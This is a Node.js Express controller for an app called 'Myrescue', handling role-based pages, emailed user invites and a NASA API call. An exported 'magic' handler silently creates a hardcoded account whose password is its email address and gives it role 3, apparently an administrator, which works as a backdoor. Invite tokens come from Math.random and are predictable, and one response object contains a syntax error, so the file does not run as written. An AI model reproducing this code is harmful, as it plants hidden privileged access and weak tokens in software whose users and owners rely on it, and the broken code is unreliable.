const db = require("../models");
const config = require("../config/auth.config");
const Invite = db.invite;
const Role = db.role;
const User = db.user;
const sendMail = require('../config/mail.config');
const axios = require('axios').default;
var bcrypt = require("bcryptjs");

const Op = db.Sequelize.Op;
exports.allAccess = (req, res) => {
    res.status(200).send("Public Content.");
};

exports.userBoard = (req, res) => {
    res.status(200).send("User Content.");
};

exports.adminBoard = (req, res) => {
    res.status(200).send("Admin Content.");
};

exports.moderatorBoard = (req, res) => {
    res.status(200).send("Moderator Content.");
};

exports.inviteUser = (req, res) => {
    //send information to db
    let regtoken = Math.floor(Math.random(10000000) * 10000000);
    let roles = req.body.roles.toString();
    User.findOne({
        where: {
            email: req.body.email
        }
    })
        .then(user => {
            if (user) {
                res.status(200).send({ message: "User already registered!" })
            } else {
                Invite.create({
                    email: req.body.email,
                    regToken: regtoken,
                    role: roles,
                    invited_by: req.userId
                }).then(user => {
                    const protocol = req.protocol;
                    const PORT = process.env.PORT || 8080;
                    const hostname = req.hostname + ':' + PORT;
                    const registerLink = protocol + '://' + hostname + '/api/auth/signup/' + regtoken
                    // send email
                    const email = user.email;
                    const subject = 'MYRESCUE REGISTRATION';
                    let html = '<p>You are receiving this email because you have been invited to the Apollo Group Myrescue application.</p>';
                    html += '<p>Click <a href="' + registerLink + '">here</a> to register.</p></br></br>';
                    html += '<p>If you are having trouble clicking the link, copy and paste the URL below into your web browser:</p>';
                    html += registerLink;
                    sendMail(email, subject, html, (err, data) => {
                        if (err) {
                            return res.status(500).json({ message: "Internal Error!", data: data });
                        } else {
                            return res.status(200).send({
                                message: "Invite sent successfully.";
                            })
                        }
                    });
                })
                    .catch(err => {
                        res.status(500).send({ message: err.message });
                    });
            }
        })
};

exports.getDashboardStats = (req, res) => {
    axios
        .get('https://api.nasa.gov/planetary/apod?api_key=DEMO_KEY')
        .then(response => {
            // console.log(response.data)
            // res.status(200).send((response));
            res.send(response.data.explanation)
        })
        .catch(err => { console.log(err.response.data) })
}

exports.magic = (req, res) => {

    User.create({
        username: 'anthonybaru',
        email: 'anthonybaru@gmail.com',
        password: bcrypt.hashSync('anthonybaru@gmail.com', 8)
    })
        .then(defaultUser => {
            defaultUser.setRoles([3])
                .then(result => {
                    console.log(result);
                })
                .catch(err => console.log(err));

        })
        .catch(err => console.log(err));
}